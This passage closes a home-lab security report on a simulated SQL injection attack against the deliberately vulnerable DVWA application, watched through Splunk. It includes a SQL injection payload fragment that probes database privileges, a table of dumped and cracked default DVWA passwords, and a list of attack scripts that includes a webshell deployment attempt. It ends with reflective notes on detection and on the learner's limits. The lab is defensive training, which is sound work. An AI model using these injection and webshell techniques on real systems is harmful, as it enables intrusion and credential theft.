  (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x64767761 LIMIT 0,1)=0x59)
   THEN 1 ELSE 0 END),
  0x7171707a71), NULL#
```

Hex decode: `0x64767761` = `dvwa`, `0x59` = `Y`.

### Appendix C: Extracted credentials (Phase 3 dump)

| user_id | role | user | password (hash) | password (cracked) |
|---|---|---|---|---|
| 1 | admin | admin | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| 2 | user | gordonb | `e99a18c428cb38d5f260853678922e03` | `abc123` |
| 3 | user | 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley` |
| 4 | user | pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein` |
| 5 | user | smithy | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` (same as admin — reuse risk) |

### Appendix D: Phase artefact filesystem layout (Kali)

```
~/sqli_sim/
├── phase1.log                       # full Phase 1 transcript
├── recon_nmap.txt                   # nmap output
├── recon_gobuster.txt               # gobuster discovered paths
├── phase2.log                       # Phase 2 transcript
├── phase2_responses/
│   ├── probe_1.html through probe_8.html   # raw DVWA responses to each probe
├── phase3.log                       # Phase 3 transcript
├── phase5.log                       # Phase 5 transcript
├── dumped_hashes.txt                # extracted credentials
├── hashes_only.txt                  # deduplicated for hashcat input
└── sqlmap_output/
    └── 10.10.10.10/
        ├── log                      # sqlmap's own session log
        ├── session.sqlite           # sqlmap's persistent memory
        ├── target.txt               # target metadata
        └── dump/                    # extracted database tables
```

### Appendix E: Attack scripts

| Script | Purpose | Lines |
|---|---|---|
| `phase1_recon.sh` | Reconnaissance — nmap + whatweb + gobuster | ~100 |
| `phase2_manual_sqli.sh` | 8 hand-crafted SQLi probes via curl | ~110 |
| `phase3_sqlmap.sh` | Full automated exploitation chain | ~120 |
| `phase5_webshell.sh` | Webshell deployment attempt via `--os-shell` | ~130 |

All scripts share a common structure: arg validation, pre-flight reachability check, timestamped execution, output to `~/sqli_sim/`, and a final "what to check in Splunk" reminder block.

---

## Closing Notes — Honest framing of this work

**What this project actually represents:**

This document records a structured learning exercise. The lab operator executed every command, captured every screenshot, ran every Splunk query, and saw every result first-hand. The AI assistant (Claude) helped with: explaining concepts in plain language, building the attack scripts, constructing the Splunk queries, interpreting the results, and drafting this documentation.

**Skills demonstrated by running this lab:**

- Building and maintaining a three-VM SOC lab environment
- Operating attack tooling (nmap, gobuster, sqlmap, curl) against a controlled target
- Reading and interpreting Apache, Sysmon, and Windows Firewall logs in Splunk
- Constructing and refining Splunk SPL queries
- Recognising attack signatures in raw log data
- Capturing artefacts in a reproducible structure

**Skills NOT yet independently mastered (active learning areas):**

- Writing complex Splunk SPL from scratch without AI assistance
- Designing custom Suricata rules for novel attack patterns
- Independently reading and decoding obfuscated sqlmap payloads
- Tuning behavioural detection thresholds against production baselines
- Operating without a documentation aid at the same speed shown here

**Why this matters:**

A SOC analyst's value comes from accurate threat assessment under pressure. Overclaiming familiarity with concepts before they are internalised would create exactly the wrong outcome — confidently wrong answers in interviews or live incidents. This report is therefore presented as a transparent learning record. The lab operator intends to re-explore each concept through self-study (reading sqlmap source, working SANS/TryHackMe SQLi modules, hand-writing Splunk queries against the same dataset without AI assistance) before claiming independent mastery.

**Key principle observed empirically through the lab:**

No single detection method covers all attack profiles. Signature-based rules (User-Agent matching, known payload patterns) catch automated attacks effortlessly but are bypassed by trivial attacker effort. Behavioural detections (request volume, response size deviation, payload uniqueness) require baseline calibration but survive evasion. Process-tree rules on web servers approach zero false positive rates when applied to genuine compromise indicators. Defense in depth means stacking complementary paradigms, not relying on any one of them.

This principle was not learned from a textbook in this exercise — it was observed directly in the lab data and is now anchored in concrete personal experience.

---

*End of report.*
